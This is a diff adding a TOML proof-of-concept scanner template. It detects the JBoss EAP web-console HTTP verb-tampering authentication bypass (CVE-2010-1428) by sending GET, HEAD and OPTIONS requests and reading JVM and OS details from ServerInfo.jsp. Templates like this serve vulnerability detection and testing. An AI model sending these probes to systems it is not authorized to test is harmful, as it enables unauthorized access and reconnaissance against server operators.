@@ -1,0 +1,67 @@
+[info]
+id = "POC-AVE-2010-0008"
+name = "Red Hat JBoss Web Console HTTP 方法认证绕过检测 PoC"
+author = "AVE"
+severity = "high"
+tags = ["authentication-bypass", "jboss", "information-disclosure", "CWE-749"]
+description = "检测 JBoss EAP /web-console 是否存在 HTTP 动词绕过漏洞（CVE-2010-1428）。访问控制仅对 GET/POST 生效，使用 HEAD/OPTIONS 等方法可绕过认证。"
+vuln_id = ["CVE-2010-1428", "AVE-2010-0008"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/web-console/"
+headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+part = "status"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["Server", "JBoss", "Tomcat", "Welcome"]
+expect = true
+
+[[poc.requests]]
+method = "HEAD"
+path = "/web-console/"
+headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+part = "status"
+
+[[poc.requests]]
+method = "OPTIONS"
+path = "/web-console/"
+headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+part = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/web-console/ServerInfo.jsp"
+headers = { "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+part = "status"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["JVM", "java.version", "java.vendor", "os.name", "jboss"]
+expect = true
